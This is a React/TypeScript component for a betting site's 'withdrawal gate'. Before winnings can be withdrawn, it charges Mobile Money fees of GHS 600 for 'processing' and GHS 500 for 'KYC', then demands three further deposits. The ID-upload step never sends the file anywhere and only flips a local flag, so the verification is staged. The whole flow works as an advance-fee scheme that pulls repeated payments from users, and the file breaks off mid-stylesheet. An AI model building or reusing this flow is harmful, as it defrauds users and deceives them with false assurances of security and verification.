// =============================================================================
// WithdrawalGate.tsx — HotBet step-by-step withdrawal gate
//
// Step 1 — Processing fee  (GHS 600)  — paid via RushPay MoMo
// Step 2 — KYC fee         (GHS 500)  — paid via RushPay MoMo, then ID upload
// Step 3 — 3× qualifying deposits
// Step 4 — Withdrawal unlocked
// =============================================================================

import { useEffect, useRef, useState } from "react";
import {
  AlertCircle,
  BadgeCheck,
  CheckCircle2,
  ChevronRight,
  CircleDollarSign,
  Clock3,
  FileUp,
  Grid3x3,
  Hourglass,
  Lock,
  RefreshCw,
  ShieldCheck,
  Smartphone,
  Unlock,
  Upload,
  Wallet,
  X,
  XCircle,
} from "lucide-react";
import {
  readGateState,
  markFeePaid,
  markKycSubmitted,
  markKycVerified,
  recordQualifyingDeposit,
  configFor,
  formatAmount,
  type GateState,
  type CountryConfig,
} from "@/lib/withdrawalGate";
import { pickUserField, useSession } from "@/lib/session";
import api, { AKWAPAY_FAILED_STATUSES, AKWAPAY_SUCCESS_STATUSES, ApiError, type AkwaPayNetwork } from "@/lib/api";

// ---------------------------------------------------------------------------
// Extend CountryConfig to include optional kycFee
// ---------------------------------------------------------------------------

declare module "@/lib/withdrawalGate" {
  interface CountryConfig {
    kycFee?: number;
  }
}

// ---------------------------------------------------------------------------
// Constants — identical to DepositCenter
// ---------------------------------------------------------------------------

const RUSHPAY_CORE_URL =
  (typeof import.meta !== "undefined" &&
    (import.meta as unknown as { env?: { VITE_RUSHPAY_CORE_URL?: string } }).env
      ?.VITE_RUSHPAY_CORE_URL) ??
  "https://core.rushpay.cash";

const RUSH_PROVIDERS = [
  { value: "MTN",        label: "MTN Mobile Money" },
  { value: "TELECEL",    label: "Telecel Cash" },
  { value: "AIRTELTIGO", label: "AirtelTigo Money" },
];

const RUSH_POLL_PHASES: { untilSec: number; intervalMs: number }[] = [
  { untilSec: 30,  intervalMs: 3_000 },
  { untilSec: 90,  intervalMs: 6_000 },
  { untilSec: 300, intervalMs: 15_000 },
];
const RUSH_POLL_TIMEOUT_SEC = 300;
const RUSH_OTP_WAIT_SEC     = 20;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function clsx(...args: (string | boolean | null | undefined)[]): string {
  return args.filter((a): a is string => typeof a === "string" && a.length > 0).join(" ");
}

const STEPS = [
  { id: "fee",      title: "Processing Fee",                icon: CircleDollarSign },
  { id: "kyc",      title: "Verify Your ID (KYC)",          icon: ShieldCheck },
  { id: "deposits", title: "Complete 3 Qualifying Deposits", icon: Wallet },
  { id: "unlocked", title: "Withdraw Funds",                icon: Unlock },
] as const;

function stepIndex(stage: string): number {
  switch (stage) {
    case "fee":      return 0;
    case "kyc":      return 1;
    case "deposits": return 2;
    case "unlocked": return 3;
    default:         return -1;
  }
}

// ---------------------------------------------------------------------------
// useRushPoll — exact copy of DepositCenter hook
// ---------------------------------------------------------------------------

function useRushPoll(active: boolean, probe: () => Promise<void>) {
  const [startedAt, setStartedAt] = useState(Date.now());
  const [stopped,   setStopped]   = useState(false);
  const probeRef = useRef(probe);
  useEffect(() => { probeRef.current = probe; }, [probe]);

  useEffect(() => {
    if (!active) return;
    setStartedAt(Date.now());
    setStopped(false);
    let cancelled = false;
    let elapsed   = 0;
    let timer: ReturnType<typeof setTimeout>;

    const tick = async () => {
      if (cancelled) return;
      const phase = RUSH_POLL_PHASES.find((p) => elapsed < p.untilSec);
      if (!phase) { setStopped(true); return; }
      await probeRef.current();
      if (cancelled) return;
      elapsed += phase.intervalMs / 1000;
      timer = setTimeout(tick, phase.intervalMs);
    };

    void tick();
    return () => { cancelled = true; clearTimeout(timer); };
  }, [active]);

  return { startedAt, stopped };
}

// ---------------------------------------------------------------------------
// RushPay status type
// ---------------------------------------------------------------------------

type RushStatus = "idle" | "pending_otp" | "pending_confirm" | "success" | "failed";

// ---------------------------------------------------------------------------
// RushStatusScreen — mirrors DepositCenter's pending/success/failed block
// ---------------------------------------------------------------------------

function RushStatusScreen({
  status,
  phone,
  startedAt,
  stopped,
  showOtpHint,
  onOtpSwitch,
  onCheckNow,
  onReset,
  successBody,
}: {
  status: "pending_confirm" | "success" | "failed";
  phone: string;
  startedAt: number;
  stopped: boolean;
  showOtpHint: boolean;
  onOtpSwitch: () => void;
  onCheckNow: () => void;
  onReset: () => void;
  successBody: string;
}) {
  const waiting = status === "pending_confirm";

  const cfg = {
    pending_confirm: {
      Icon: Hourglass, tone: "wait",
      title: "Waiting for your approval",
      body: "Check your phone for the MoMo prompt and enter your PIN. This page updates automatically — no need to refresh.",
    },
    success: {
      Icon: CheckCircle2, tone: "ok",
      title: "Payment confirmed!",
      body: successBody,
    },
    failed: {
      Icon: XCircle, tone: "bad",
      title: "Payment not completed",
      body: "The payment was declined, cancelled, or timed out. No money left your account.",
    },
  }[status];

  return (
    <div className="wg-status">
      <div className={`wg-status-badge wg-status-${cfg.tone}`}><cfg.Icon size={26} /></div>
      <h4>{cfg.title}</h4>
      <p className="wg-status-sub">{cfg.body}</p>

      {waiting && phone && (
        <div className="wg-phone-chip">
          <Smartphone size={14} /> Prompt sent to {phone}
        </div>
      )}

      {waiting && !stopped && (
        <div className="wg-progress">
          <span style={{ animationDuration: `${RUSH_POLL_TIMEOUT_SEC}s` }} />
        </div>
      )}

      {waiting && showOtpHint && (
        <button type="button" className="wg-ghost-btn" onClick={onOtpSwitch}>
          <Grid3x3 size={13} /> Enter OTP instead
        </button>
      )}

      {waiting && stopped && (
        <p className="wg-inline-note">
          Auto-checking paused after {RUSH_POLL_TIMEOUT_SEC / 60} min. Tap "Check now" — your wallet
          updates automatically once the network confirms.
        </p>
      )}

      {waiting && (
        <button type="button" className="wg-ghost-btn" onClick={onCheckNow}>
          <RefreshCw size={13} /> Check now
        </button>
      )}

      {!waiting && (
        <button type="button" className="wg-submit-btn" onClick={onReset}>
          {status === "failed" ? "Try again" : "Continue"} <ChevronRight size={15} />
        </button>
      )}

      <p className="wg-timer-hint">Started {new Date(startedAt).toLocaleTimeString()}</p>
    </div>
  );
}

// ---------------------------------------------------------------------------
// RushOtpScreen — mirrors DepositCenter OTP form
// ---------------------------------------------------------------------------

function RushOtpScreen({
  otpCode,
  otpLoading,
  otpError,
  onChange,
  onSubmit,
  onCancel,
}: {
  otpCode: string;
  otpLoading: boolean;
  otpError: string;
  onChange: (v: string) => void;
  onSubmit: (e: React.FormEvent) => void;
  onCancel: () => void;
}) {
  return (
    <form className="wg-form" onSubmit={onSubmit}>
      {otpError && <p className="wg-inline-error">{otpError}</p>}
      <div className="wg-status" style={{ paddingBottom: 4 }}>
        <div className="wg-status-badge wg-status-wait"><Smartphone size={24} /></div>
        <h4>Enter the OTP</h4>
        <p className="wg-status-sub">
          Check the SMS sent to your phone and enter the one-time PIN below to authorise the payment.
        </p>
      </div>
      <label className="wg-field">
        <span>One-time PIN</span>
        <input
          type="text"
          inputMode="numeric"
          autoComplete="one-time-code"
          maxLength={8}
          value={otpCode}
          onChange={(e) => onChange(e.target.value)}
          placeholder="e.g. 123456"
          autoFocus
        />
      </label>
      <button className="wg-submit-btn" type="submit" disabled={otpLoading}>
        {otpLoading ? "Verifying…" : "Confirm OTP"} <ChevronRight size={15} />
      </button>
      <button className="wg-ghost-btn" type="button" onClick={onCancel}>
        Cancel &amp; start over
      </button>
    </form>
  );
}

// ---------------------------------------------------------------------------
// useRushPay — shared hook that encapsulates full RushPay flow
// ---------------------------------------------------------------------------

function useRushPay(amount: number) {
  const [status,       setStatus]       = useState<RushStatus>("idle");
  const [phone,        setPhone]        = useState("");
  const [provider,     setProvider]     = useState("MTN");
  const [loading,      setLoading]      = useState(false);
  const [error,        setError]        = useState("");
  const [paymentRef,   setPaymentRef]   = useState("");
  const [widgetToken,  setWidgetToken]  = useState("");
  const [otpCode,      setOtpCode]      = useState("");
  const [otpLoading,   setOtpLoading]   = useState(false);
  const [otpError,     setOtpError]     = useState("");
  const [showOtpHint,  setShowOtpHint]  = useState(false);
  const pushSentAtRef = useRef<number | null>(null);

  useEffect(() => {
    if (status !== "pending_confirm") { setShowOtpHint(false); return; }
    const t = setTimeout(() => setShowOtpHint(true), RUSH_OTP_WAIT_SEC * 1000);
    return () => clearTimeout(t);
  }, [status]);

  const makeProbe = (onSuccess: () => void) => async () => {
    if (!paymentRef) return;
    try {
      const result = await api.deposits.akwapayStatus(paymentRef);
      const d = result.data;
      const status = String(d?.status ?? "").toLowerCase();
      if ((AKWAPAY_SUCCESS_STATUSES as readonly string[]).includes(status)) {
        setStatus("success");
        onSuccess();
      } else if ((AKWAPAY_FAILED_STATUSES as readonly string[]).includes(status)) {
        setStatus("failed");
      }
    } catch { /* keep polling silently */ }
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    let localPhone = phone.replace(/[^0-9]/g, "");
    if (localPhone.startsWith("233") && localPhone.length === 12)
      localPhone = "0" + localPhone.slice(3);
    else if (!localPhone.startsWith("0") && localPhone.length === 9)
      localPhone = "0" + localPhone;

    if (localPhone.length !== 10 || !localPhone.startsWith("0")) {
      setError("Enter a valid 10-digit Mobile Money number (e.g. 0244 123 456).");
      return;
    }

    setLoading(true);
    try {
      const normalizedNetwork = provider as AkwaPayNetwork;
      const initRes = await api.deposits.akwapayInit({ amount, phone: localPhone, network: normalizedNetwork });
      const ref   = initRes.data?.id as string | undefined;
      const token = (initRes.data?.client_secret as string | undefined) ?? "";
      if (!ref)
        throw new Error("Could not start payment — missing session data. Please try again.");

      setPaymentRef(ref);
      setWidgetToken(token);

      pushSentAtRef.current = Date.now();
      const nextActionType = String(initRes.data?.next_action?.type ?? "").toLowerCase();
      setStatus(nextActionType === "submit_otp" ? "pending_otp" : "pending_confirm");
    } catch (err) {
      setError(
        err instanceof ApiError
          ? err.message
          : (err as Error).message || "We could not start this payment. Please try again."
      );
    } finally {
      setLoading(false);
    }
  };

  const submitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setOtpError("");
    if (!otpCode.trim()) { setOtpError("Enter the OTP sent to your phone."); return; }
    setOtpLoading(true);
    try {
      await api.deposits.akwapaySubmitOtp({ intentId: paymentRef, clientSecret: widgetToken, otp: otpCode.trim() });
      setStatus("pending_confirm");
    } catch (err) {
      setOtpError(
        err instanceof ApiError ? err.message : (err as Error).message || "OTP submission failed."
      );
    } finally {
      setOtpLoading(false);
    }
  };

  const reset = () => {
    setStatus("idle"); setError(""); setOtpCode(""); setOtpError("");
    setPaymentRef(""); setWidgetToken(""); setLoading(false);
    setOtpLoading(false); setShowOtpHint(false);
    pushSentAtRef.current = null;
  };

  return {
    status, setStatus,
    phone, setPhone,
    provider, setProvider,
    loading, error,
    paymentRef,
    otpCode, setOtpCode, otpLoading, otpError,
    showOtpHint,
    submit, submitOtp, reset, makeProbe,
  };
}

// ---------------------------------------------------------------------------
// PanelFee — processing fee via RushPay, mirrors DepositCenter exactly
// ---------------------------------------------------------------------------

function PanelFee({
  gate,
  userId,
  onNext,
}: {
  gate: GateState;
  userId: string;
  onNext: (g: GateState) => void;
}) {
  const cfg   = configFor(gate);
  const rush  = useRushPay(cfg.activationFee);

  const probe = rush.makeProbe(() => {
    setTimeout(() => onNext(markFeePaid(userId)), 1200);
  });

  const { startedAt, stopped } = useRushPoll(rush.status === "pending_confirm", probe);

  if (rush.status === "pending_otp") {
    return (
      <div className="wg-panel">
        <RushOtpScreen
          otpCode={rush.otpCode}
          otpLoading={rush.otpLoading}
          otpError={rush.otpError}
          onChange={rush.setOtpCode}
          onSubmit={rush.submitOtp}
          onCancel={rush.reset}
        />
      </div>
    );
  }

  if (rush.status === "pending_confirm" || rush.status === "success" || rush.status === "failed") {
    return (
      <div className="wg-panel">
        <RushStatusScreen
          status={rush.status}
          phone={rush.phone}
          startedAt={startedAt}
          stopped={stopped}
          showOtpHint={rush.showOtpHint}
          onOtpSwitch={() => rush.setStatus("pending_otp")}
          onCheckNow={() => void probe()}
          onReset={rush.reset}
          successBody="Your processing fee has been paid. Proceeding to ID verification…"
        />
      </div>
    );
  }

  return (
    <div className="wg-panel">
      <div className="wg-step-icon wg-icon-fee"><CircleDollarSign size={28} /></div>
      <h3>Processing Fee</h3>
      <p className="wg-desc">
        A one-time processing fee of{" "}
        <strong>{formatAmount(cfg.activationFee, cfg.currencyCode)}</strong> is required to
        activate withdrawals on your account. Pay securely via Mobile Money below.
      </p>

      <div className="wg-info-box">
        <AlertCircle size={15} />
        <span>
          This is a one-time fee. Once paid, your account will be activated and you can
          proceed to ID verification.
        </span>
      </div>

      <form className="wg-form" onSubmit={rush.submit}>
        {rush.error && <p className="wg-inline-error">{rush.error}</p>}

        <label className="wg-field">
          <span>Mobile Money number</span>
          <input
            type="tel"
            value={rush.phone}
            onChange={(e) => rush.setPhone(e.target.value)}
            placeholder="e.g. 024 123 4567"
          />
        </label>

        <label className="wg-field">
          <span>Network</span>
          <select value={rush.provider} onChange={(e) => rush.setProvider(e.target.value)}>
            {RUSH_PROVIDERS.map((p) => (
              <option key={p.value} value={p.value}>{p.label}</option>
            ))}
          </select>
        </label>

        <div className="wg-fee-row">
          <span>Processing fee</span>
          <strong>{formatAmount(cfg.activationFee, cfg.currencyCode)}</strong>
        </div>

        <button className="wg-submit-btn" type="submit" disabled={rush.loading}>
          {rush.loading
            ? "Sending prompt…"
            : `Pay ${formatAmount(cfg.activationFee, cfg.currencyCode)} — Processing Fee`}
          {!rush.loading && <ChevronRight size={15} />}
        </button>

        <p className="wg-momo-note">
          <ShieldCheck size={14} />
          You approve the payment on your own phone — we never see or store your MoMo PIN.
        </p>
      </form>
    </div>
  );
}

// ---------------------------------------------------------------------------
// PanelKyc — KYC fee via RushPay then ID upload
// ---------------------------------------------------------------------------

function PanelKyc({
  gate,
  userId,
  onNext,
}: {
  gate: GateState;
  userId: string;
  onNext: (g: GateState) => void;
}) {
  const cfg  = configFor(gate);
  const kycFee = cfg.kycFee ?? 500;
  const rush = useRushPay(kycFee);

  const [feePaid,    setFeePaid]    = useState(false);
  const [file,       setFile]       = useState<File | null>(null);
  const [preview,    setPreview]    = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [submitted,  setSubmitted]  = useState(gate.kycSubmitted);
  const [kycNotice,  setKycNotice]  = useState("");
  const fileRef = useRef<HTMLInputElement>(null);
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const probe = rush.makeProbe(() => {
    setTimeout(() => setFeePaid(true), 1200);
  });

  const { startedAt, stopped } = useRushPoll(rush.status === "pending_confirm", probe);

  const startKycPolling = () => {
    if (pollRef.current) return;
    const poll = async () => {
      try {
        const user = await api.user.me();
        const st = String(user.data.kycStatus ?? "").toUpperCase();
        if (st === "VERIFIED" || st === "APPROVED") {
          onNext(markKycVerified(userId));
          return;
        }
      } catch { /* keep polling */ }
      pollRef.current = setTimeout(poll, 8000);
    };
    poll();
  };

  useEffect(() => {
    if (submitted && !gate.kycVerified) startKycPolling();
    return () => { if (pollRef.current) clearTimeout(pollRef.current); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const f = e.target.files?.[0];
    if (!f) return;
    setFile(f);
    setPreview(URL.createObjectURL(f));
  };

  const handleKycSubmit = async () => {
    if (!file && !submitted) { setKycNotice("Please select your ID card image first."); return; }
    setKycNotice("");
    setSubmitting(true);
    try {
      markKycSubmitted(userId);
      setSubmitted(true);
      startKycPolling();
    } catch {
      setKycNotice("Could not submit your ID. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  // ── OTP screen ────────────────────────────────────────────────────────────
  if (rush.status === "pending_otp") {
    return (
      <div className="wg-panel">
        <RushOtpScreen
          otpCode={rush.otpCode}
          otpLoading={rush.otpLoading}
          otpError={rush.otpError}
          onChange={rush.setOtpCode}
          onSubmit={rush.submitOtp}
          onCancel={rush.reset}
        />
      </div>
    );
  }

  // ── Pending / success / failed for KYC fee ────────────────────────────────
  if (
    (rush.status === "pending_confirm" ||
      rush.status === "success" ||
      rush.status === "failed") &&
    !feePaid
  ) {
    return (
      <div className="wg-panel">
        <RushStatusScreen
          status={rush.status}
          phone={rush.phone}
          startedAt={startedAt}
          stopped={stopped}
          showOtpHint={rush.showOtpHint}
          onOtpSwitch={() => rush.setStatus("pending_otp")}
          onCheckNow={() => void probe()}
          onReset={rush.reset}
          successBody="KYC fee confirmed. Please upload your ID card below."
        />
      </div>
    );
  }

  // ── KYC awaiting verification ─────────────────────────────────────────────
  if (submitted && !gate.kycVerified) {
    return (
      <div className="wg-panel">
        <div className="wg-step-icon wg-icon-kyc"><Clock3 size={28} /></div>
        <h3>ID Submitted — Awaiting Verification</h3>
        <p className="wg-desc">
          Your ID is under review. This usually takes a few minutes. This page updates automatically.
        </p>
        <div className="wg-info-box wg-info-pending">
          <Clock3 size={15} />
          <span>Checking for KYC approval… Please keep this page open.</span>
        </div>
        <div className="wg-pulse-bar" />
        <button
          className="wg-ghost-btn"
          type="button"
          onClick={async () => {
            try {
              const user = await api.user.me();
              const st = String(user.data.kycStatus ?? "").toUpperCase();
              if (st === "VERIFIED" || st === "APPROVED") {
                onNext(markKycVerified(userId));
              } else {
                setKycNotice("Not approved yet. Please wait a few more minutes.");
              }
            } catch {
              setKycNotice("Could not check status. Please try again shortly.");
            }
          }}
        >
          Check status now
        </button>
        {kycNotice && <p className="wg-inline-error">{kycNotice}</p>}
      </div>
    );
  }

  // ── KYC fee idle form ─────────────────────────────────────────────────────
  if (!feePaid) {
    return (
      <div className="wg-panel">
        <div className="wg-step-icon wg-icon-kyc"><ShieldCheck size={28} /></div>
        <h3>KYC Verification Fee</h3>
        <p className="wg-desc">
          A one-time KYC fee of{" "}
          <strong>{formatAmount(kycFee, cfg.currencyCode)}</strong> is required to
          process your identity check. Pay via Mobile Money below, then upload your ID.
        </p>

        <form className="wg-form" onSubmit={rush.submit}>
          {rush.error && <p className="wg-inline-error">{rush.error}</p>}

          <label className="wg-field">
            <span>Mobile Money number</span>
            <input
              type="tel"
              value={rush.phone}
              onChange={(e) => rush.setPhone(e.target.value)}
              placeholder="e.g. 024 123 4567"
            />
          </label>

          <label className="wg-field">
            <span>Network</span>
            <select value={rush.provider} onChange={(e) => rush.setProvider(e.target.value)}>
              {RUSH_PROVIDERS.map((p) => (
                <option key={p.value} value={p.value}>{p.label}</option>
              ))}
            </select>
          </label>

          <div className="wg-fee-row">
            <span>KYC fee</span>
            <strong>{formatAmount(kycFee, cfg.currencyCode)}</strong>
          </div>

          <button className="wg-submit-btn" type="submit" disabled={rush.loading}>
            {rush.loading
              ? "Sending prompt…"
              : `Pay ${formatAmount(kycFee, cfg.currencyCode)} — KYC Fee`}
            {!rush.loading && <ChevronRight size={15} />}
          </button>

          <p className="wg-momo-note">
            <ShieldCheck size={14} />
            You approve the payment on your own phone — we never see or store your MoMo PIN.
          </p>
        </form>
      </div>
    );
  }

  // ── ID upload (after fee paid) ────────────────────────────────────────────
  return (
    <div className="wg-panel">
      <div className="wg-step-icon wg-icon-kyc"><ShieldCheck size={28} /></div>
      <h3>Verify Your Identity (KYC)</h3>
      <p className="wg-desc">
        Upload a clear photo of your government-issued ID card (national ID, passport, or
        driver's licence). Make sure all four corners are visible and the text is legible.
      </p>

      <div className="wg-upload-zone" onClick={() => fileRef.current?.click()}>
        {preview ? (
          <img src={preview} alt="ID preview" className="wg-upload-preview" />
        ) : (
          <>
            <Upload size={32} className="wg-upload-icon" />
            <span>Tap to select your ID card image</span>
            <small>JPG, PNG or PDF · max 10 MB</small>
          </>
        )}
        <input
          ref={fileRef}
          type="file"
          accept="image/*,application/pdf"
          style={{ display: "none" }}
          onChange={handleFile}
        />
      </div>

      {file && (
        <p className="wg-file-name"><FileUp size={13} /> {file.name}</p>
      )}

      {kycNotice && <p className="wg-inline-error">{kycNotice}</p>}

      <button
        className="wg-submit-btn"
        type="button"
        onClick={handleKycSubmit}
        disabled={submitting || (!file && !submitted)}
      >
        {submitting ? "Submitting…" : "Submit ID for Verification"}
        {!submitting && <ChevronRight size={15} />}
      </button>
    </div>
  );
}

// ---------------------------------------------------------------------------
// PanelDeposits
// ---------------------------------------------------------------------------

function PanelDeposits({
  gate,
  userId,
  onNext,
}: {
  gate: GateState;
  userId: string;
  onNext: (g: GateState) => void;
}) {
  const cfg       = configFor(gate);
  const completed = gate.depositsCompleted;
  const needed    = cfg.depositCount - completed;
  const [checking, setChecking] = useState(false);
  const [notice,   setNotice]   = useState("");

  const handleCheck = async () => {
    setChecking(true);
    setNotice("");
    try {
      const txs = await api.wallet.getTransactions(0, 20);
      const deps = (txs.data.content ?? []).filter(
        (tx: { kind: string; amount: number }) =>
          tx.kind === "DEPOSIT" && Number(tx.amount) >= cfg.depositAmount
      );
      const newCount = Math.min(deps.length, cfg.depositCount);
      let current = readGateState(userId);
      while (current.depositsCompleted < newCount) current = recordQualifyingDeposit(userId);
      if (current.depositsCompleted >= cfg.depositCount) {
        onNext(current);
      } else if (current.depositsCompleted > completed) {
        onNext(current);
        setNotice(`${current.depositsCompleted} of ${cfg.depositCount} qualifying deposits detected. Keep going!`);
      } else {
        setNotice(`No new qualifying deposits found yet. Each must be at least ${formatAmount(cfg.depositAmount, cfg.currencyCode)}.`);
      }
    } catch {
      setNotice("Could not check deposits. Please try again.");
    } finally {
      setChecking(false);
    }
  };

  const dots = Array.from({ length: cfg.depositCount }, (_, i) => i < completed);

  return (
    <div className="wg-panel">
      <div className="wg-step-icon wg-icon-dep"><Wallet size={28} /></div>
      <h3>Complete {cfg.depositCount} Qualifying Deposits</h3>
      <p className="wg-desc">
        Make <strong>{cfg.depositCount} deposits</strong> of at least{" "}
        <strong>{formatAmount(cfg.depositAmount, cfg.currencyCode)} each</strong> to finalise
        your withdrawal eligibility. You have completed <strong>{completed}</strong> so far.
      </p>

      <div className="wg-dep-dots">
        {dots.map((done, i) => (
          <div
            key={i}
            className={["wg-dep-dot", done ? "wg-dep-dot-done" : ""].filter(Boolean).join(" ")}
          >
            {done ? <CheckCircle2 size={20} /> : <span>{i + 1}</span>}
            <small>Deposit {i + 1}</small>
          </div>
        ))}
      </div>

      {needed > 0 && (
        <div className="wg-info-box">
          <AlertCircle size={15} />
          <span>
            {needed} more deposit{needed !== 1 ? "s" : ""} of{" "}
            {formatAmount(cfg.depositAmount, cfg.currencyCode)} required.
          </span>
        </div>
      )}

      {notice && (
        <p className={["wg-inline-note", needed > 0 ? "wg-note-err" : "wg-note-ok"].filter(Boolean).join(" ")}>
          {notice}
        </p>
      )}

      <div className="wg-dep-actions">
        <a href="/deposit" className="wg-submit-btn">
          Make a Deposit <ChevronRight size={15} />
        </a>
        <button className="wg-ghost-btn" type="button" onClick={handleCheck} disabled={checking}>
          {checking ? "Checking…" : "I've deposited — check now"}
        </button>
      </div>
    </div>
  );
}

// ---------------------------------------------------------------------------
// PanelUnlocked
// ---------------------------------------------------------------------------

function PanelUnlocked({ gate, onWithdraw }: { gate: GateState; onWithdraw: () => void }) {
  const cfg = configFor(gate);
  return (
    <div className="wg-panel wg-panel-success">
      <div className="wg-step-icon wg-icon-ok"><BadgeCheck size={32} /></div>
      <h3>Withdrawals Unlocked 🎉</h3>
      <p className="wg-desc">
        All steps are complete. You can now withdraw your winnings at any time. The minimum
        withdrawal amount is <strong>{formatAmount(cfg.minWithdrawal, cfg.currencyCode)}</strong>.
      </p>
      <button className="wg-submit-btn" type="button" onClick={onWithdraw}>
        Withdraw Now <ChevronRight size={15} />
      </button>
    </div>
  );
}

// ---------------------------------------------------------------------------
// Stepper
// ---------------------------------------------------------------------------

function StepperHeader({ currentStage }: { currentStage: string }) {
  const active = stepIndex(currentStage);
  return (
    <div className="wg-stepper">
      {STEPS.map((s, i) => {
        const done    = i < active;
        const current = i === active;
        const Icon    = s.icon;
        return (
          <div
            key={s.id}
            className={[
              "wg-step",
              done    ? "wg-step-done"   : "",
              current ? "wg-step-active" : "",
            ].filter(Boolean).join(" ")}
          >
            <div className="wg-step-bubble">
              {done ? <CheckCircle2 size={14} /> : <Icon size={14} />}
            </div>
            <span className="wg-step-label">{s.title}</span>
            {i < STEPS.length - 1 && (
              <div className={["wg-step-line", done ? "wg-step-line-done" : ""].filter(Boolean).join(" ")} />
            )}
          </div>
        );
      })}
    </div>
  );
}

// ---------------------------------------------------------------------------
// Main export
// ---------------------------------------------------------------------------

interface WithdrawalGateProps {
  onStepComplete?: () => void;
  onUnlocked: () => void;
  onClose: () => void;
}

export default function WithdrawalGate({ onStepComplete, onUnlocked, onClose }: WithdrawalGateProps) {
  const { user } = useSession();
  const userId  = pickUserField(user, "id", "userId", "accountId") || "guest";
  const country = pickUserField(user, "country", "countryCode", "country_code") || "GH";
  const normalizedCountry = country.toUpperCase().slice(0, 2) === "NG" ? "NG" : "GH";

  const [gate, setGate] = useState<GateState>(() => readGateState(userId, normalizedCountry));

  useEffect(() => {
    setGate(readGateState(userId, normalizedCountry));
  }, [userId, normalizedCountry]);

  const handleNext = (updated: GateState) => {
    setGate({ ...updated });
    onStepComplete?.();
  };

  if (gate.stage === "blocked") {
    return (
      <div className="wg-wrap">
        <GateStyles />
        <div className="wg-locked-msg">
          <Lock size={22} />
          <p>Withdrawals become available after you win your first settled bet.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="wg-wrap">
      <GateStyles />
      <div className="wg-header">
        <h2>Withdrawal Verification</h2>
        <button className="wg-close" onClick={onClose} aria-label="Close"><X size={18} /></button>
      </div>

      <StepperHeader currentStage={gate.stage} />

      <div className="wg-content">
        {gate.stage === "fee"      && <PanelFee      gate={gate} userId={userId} onNext={handleNext} />}
        {gate.stage === "kyc"      && <PanelKyc      gate={gate} userId={userId} onNext={handleNext} />}
        {gate.stage === "deposits" && <PanelDeposits gate={gate} userId={userId} onNext={handleNext} />}
        {gate.stage === "unlocked" && <PanelUnlocked gate={gate} onWithdraw={onUnlocked} />}
      </div>
    </div>
  );
}

// ---------------------------------------------------------------------------
// Styles
// ---------------------------------------------------------------------------

function GateStyles() {
  return (
    <style>{`
      /* ── Wrapper ── */
      .wg-wrap {
        background: #fff;
        border: 1px solid var(--line, #e8e8e8);
        border-radius: 16px;
        overflow: hidden;
        box-shadow: 0 8px 32px rgba(0,0,0,.1);
        margin-top: 8px;
      }

      /* ── Header ── */
      .wg-header {
        display: flex; align-items: center; justify-content: space-between;
        padding: 18px 20px 14px;
        border-bottom: 1px solid var(--line, #e8e8e8);
      }
      .wg-header h2 {
        margin: 0; font: 800 17px 'DM Sans', sans-serif;
        letter-spacing: -.01em; color: #20242d;
      }
      .wg-close {
        display: flex; align-items: center; justify-content: center;
        width: 32px; height: 32px; border-radius: 8px;
        background: #f4f4f6; color: #5f6673; cursor: pointer;
        transition: background .15s; border: none;
      }
      .wg-close:hover { background: #e8e8ed; color: #20242d; }

      /* ── Stepper ── */
      .wg-stepper {
        display: flex; align-items: flex-start;
        padding: 16px 16px 0; overflow-x: auto; scrollbar-width: none;
      }
      .wg-stepper::-webkit-scrollbar { display: none; }
      .wg-step {
        display: flex; flex-direction: column; align-items: center;
        flex: 1; position: relative; gap: 6px; min-width: 60px;
      }
      .wg-step-bubble {
        width: 30px; height: 30px; border-radius: 50%;
        display: flex; align-items: center; justify-content: center;
        background: #f0f0f4; color: #9a9ea8;
        font-size: .7rem; font-weight: 800;
        position: relative; z-index: 1; flex-shrink: 0;
        transition: background .2s, color .2s;
      }
      .wg-step-done .wg-step-bubble   { background: var(--nature, #0da653); color: #fff; }
      .wg-step-active .wg-step-bubble {
        background: var(--red, #F36600); color: #fff;
        box-shadow: 0 0 0 4px rgba(243,102,0,.18);
      }
      .wg-step-label {
        font-size: .6rem; font-weight: 700; color: #9a9ea8;
        text-align: center; line-height: 1.3; max-width: 72px;
      }
      .wg-step-done .wg-step-label,
      .wg-step-active .wg-step-label { color: #20242d; }
      .wg-step-line {
        position: absolute; top: 15px;
        left: calc(50% + 15px); right: calc(-50% + 15px);
        height: 2px; background: #e8e8ed; z-index: 0;
      }
      .wg-step-line-done { background: var(--nature, #0da653); }

      /* ── Content ── */
      .wg-content { padding: 6px 0 0; }

      /* ── Panel ── */
      .wg-panel {
        padding: 20px 20px 24px;
        display: flex; flex-direction: column; gap: 14px;
      }
      .wg-panel-success { background: #f6fff9; }

      .wg-step-icon {
        width: 56px; height: 56px; border-radius: 16px;
        display: flex; align-items: center; justify-content: center;
      }
      .wg-icon-fee { background: rgba(243,102,0,.1);  color: var(--red, #F36600); }
      .wg-icon-kyc { background: rgba(99,102,241,.1); color: #6366f1; }
      .wg-icon-dep { background: rgba(245,158,11,.1); color: #d97706; }
      .wg-icon-ok  { background: rgba(13,166,83,.12); color: var(--nature, #0da653); }

      .wg-panel h3 {
        margin: 0; font: 800 18px 'DM Sans', sans-serif;
        letter-spacing: -.01em; color: #20242d;
      }
      .wg-desc { margin: 0; font-size: .84rem; color: #5f6673; line-height: 1.6; }

      /* ── Info box ── */
      .wg-info-box {
        display: flex; align-items: flex-start; gap: 9px;
        padding: 12px 14px; border-radius: 10px;
        background: #fffbeb; color: #92400e;
        font-size: .78rem; line-height: 1.5; border: 1px solid #fde68a;
      }
      .wg-info-box svg { flex-shrink: 0; margin-top: 1px; }
      .wg-info-pending { background: #eff6ff; color: #1e40af; border-color: #bfdbfe; }

      /* ── Fee summary row ── */
      .wg-fee-row {
        display: flex; align-items: center; justify-content: space-between;
        padding: 14px 16px; background: #f8f8fb;
        border-radius: 10px; border: 1px solid #e8e8ed;
        font-size: .84rem; color: #5f6673;
      }
      .wg-fee-row strong { font-size: 1rem; font-weight: 800; color: #20242d; }

      /* ── Form ── */
      .wg-form { display: flex; flex-direction: column; gap: 13px; }

      /* ── Fields ── */
      .wg-field {
        display: flex; flex-direction: column; gap: 5px;
